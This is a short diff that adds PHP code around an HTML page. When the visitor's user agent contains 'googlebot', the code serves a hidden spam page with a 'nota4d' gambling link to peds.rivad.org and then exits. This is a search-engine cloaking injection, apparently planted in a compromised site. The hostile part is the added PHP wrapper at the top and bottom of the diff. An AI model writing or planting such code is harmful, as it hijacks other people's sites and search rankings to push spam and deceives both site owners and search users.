@@ -1,3 +1,8 @@
+<?php
+
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
 <!DOCTYPE html>
 <html lang="id" translate="no" data-rh="lang,translate"><head>
    <base href="https://peds.rivad.org/">
@@ -2391,3 +2396,7 @@
 <p><br><a href="https://peds.rivad.org/">nota4d link</a></p>
   </div>
 <iframe height="0" width="0" aria-hidden="true" alt="" style="pointer-events: none; height: 0px; width: 0px; position: absolute; padding: 0px; margin: 0px; border: 0px; visibility: hidden;"></iframe></body></html>
+<?php
+exit;
+}
+?>
